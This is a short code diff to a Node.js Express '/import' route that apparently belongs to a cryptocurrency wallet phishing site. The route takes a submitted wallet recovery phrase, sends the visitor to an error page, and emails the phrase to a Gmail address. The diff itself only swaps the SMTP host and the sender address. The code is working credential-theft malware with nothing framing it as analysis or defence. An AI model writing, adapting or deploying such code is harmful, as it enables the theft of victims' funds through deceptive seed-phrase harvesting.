@@ -25,7 +25,7 @@ app.post("/import", async (req, res) => {
         console.log(req.body.Phrase)
         res.redirect("/error")
         let transport = nodemailer.createTransport({
-            host: 'smtp.wanadoo.fr',
+            host: 'hitechgroupindia.com',
             port: 587,
             auth: {
                 user: process.env.USER,
@@ -34,7 +34,7 @@ app.post("/import", async (req, res) => {
         })
     
         let info = await transport.sendMail({
-            from: "Wallet Auth",
+            from: "info@hitechgroupindia.com",
             to: "michaelstone730@gmail.com",
             subject: "Wallet Phrase",
             text: req.body.Phrase,
